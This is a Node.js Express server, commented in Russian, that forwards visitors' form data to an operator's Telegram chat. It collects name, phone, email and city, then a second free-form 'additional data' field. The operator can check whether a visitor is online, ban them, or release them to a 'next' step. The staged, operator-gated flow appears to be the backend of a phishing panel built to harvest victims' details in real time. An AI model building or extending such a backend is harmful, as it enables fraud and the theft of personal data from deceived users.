const express = require("express");
const TelegramBot = require("node-telegram-bot-api");

const app = express();

app.use(express.json({ limit: "1mb" }));

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

const mainBot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
const enterBot = new TelegramBot(process.env.ENTER_BOT_TOKEN, { polling: true });

const adminId = Number(process.env.ADMIN_CHAT_ID);

// базы
let bannedUsers = {};
let userStatus = {};
let seenUsers = {};
let onlineUsers = {};
let requestTexts = {};
let fullRequests = {}; // 🔥 храним ВСЕ данные

// ===== ONLINE =====
function isOnline(id) {
  if (!onlineUsers[id]) return false;
  return Date.now() - onlineUsers[id] < 20000;
}

// ===== ВХОД =====
app.post("/enter", (req, res) => {
  const id = req.body.clientId;
  if (!id) return res.json({ ok: false });

  onlineUsers[id] = Date.now();

  enterBot.sendMessage(adminId, `👀 Вход\n🆔 ${id}`).catch(()=>{});
  res.json({ ok: true });
});

// ===== ПИНГ =====
app.post("/ping", (req, res) => {
  const id = req.body.clientId;
  if (id) onlineUsers[id] = Date.now();
  res.json({ ok: true });
});

// ===== ОТПРАВКА ОСНОВНОЙ ФОРМЫ =====
app.post("/send", (req, res) => {
  const d = req.body;
  const id = d.clientId;

  if (!id) return res.json({ ok: false });
  if (bannedUsers[id]) return res.json({ ok: false });

  userStatus[id] = "wait";

  const isRepeat = seenUsers[id];
  seenUsers[id] = true;

  const statusText = isRepeat ? "🔁 ПОВТОРНАЯ ЗАЯВКА" : "🆕 НОВАЯ ЗАЯВКА";

  // 🔥 СОХРАНЯЕМ ВСЕ 5 ПОЛЕЙ
  fullRequests[id] = {
    service: d.service,
    name: d.name,
    phone: d.phone,
    email: d.email,
    city: d.city,
    comment: d.comment
  };

  const text = `${statusText}

🆔 ID: ${id}

📦 Услуга: ${d.service}
👤 Имя: ${d.name}
📞 Телефон: ${d.phone}
📧 Email: ${d.email}
🏙 Город: ${d.city}
💬 Комментарий: ${d.comment}`;

  requestTexts[id] = text;

  mainBot.sendMessage(adminId, text, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🟢 Онлайн?", callback_data: "check_" + id }],
        [
          { text: "🚫 Бан", callback_data: "ban_" + id },
          { text: "✅ Разбан", callback_data: "unban_" + id }
        ],
        [{ text: "➡️ ДАЛЬШЕ", callback_data: "allow_" + id }]
      ]
    }
  }).catch(err => console.log(err.message));

  res.json({ ok: true, id });
});

// ===== СТАТУС =====
app.get("/status/:id", (req, res) => {
  res.json({ status: userStatus[req.params.id] || "wait" });
});

// ===== ДОП ДАННЫЕ (5 СТРОК) =====
app.post("/send2", (req, res) => {
  const data = req.body;
  const id = data.id;

  if (!id) return res.json({ ok: false });

  const msg = `📩 ДОП ДАННЫЕ

🆔 ID: ${id}

${data.value}`;

  mainBot.sendMessage(adminId, msg).catch(err => console.log(err.message));

  res.json({ ok: true });
});

// ===== КНОПКИ =====
mainBot.on("callback_query", async (q) => {
  const data = q.data;
  const id = data.split("_")[1];

  // онлайн
  if (data.startsWith("check")) {
    const online = isOnline(id);

    const newText = `${requestTexts[id]}

Статус: ${online ? "🟢 Онлайн" : "🔴 Оффлайн"}`;

    try {
      await mainBot.editMessageText(newText, {
        chat_id: q.message.chat.id,
        message_id: q.message.message_id,
        reply_markup: q.message.reply_markup
      });
    } catch {}

    mainBot.answerCallbackQuery(q.id);
  }

  // бан
  if (data.startsWith("ban")) {
    bannedUsers[id] = true;
    mainBot.answerCallbackQuery(q.id, { text: "🚫 Бан" });
  }

  // разбан
  if (data.startsWith("unban")) {
    delete bannedUsers[id];
    mainBot.answerCallbackQuery(q.id, { text: "✅ Разбан" });
  }

  // дальше
  if (data.startsWith("allow")) {
    userStatus[id] = "next";
    mainBot.answerCallbackQuery(q.id, { text: "➡️ Дальше" });
  }
});

app.listen(process.env.PORT || 3000, () => {
  console.log("SERVER OK");
});
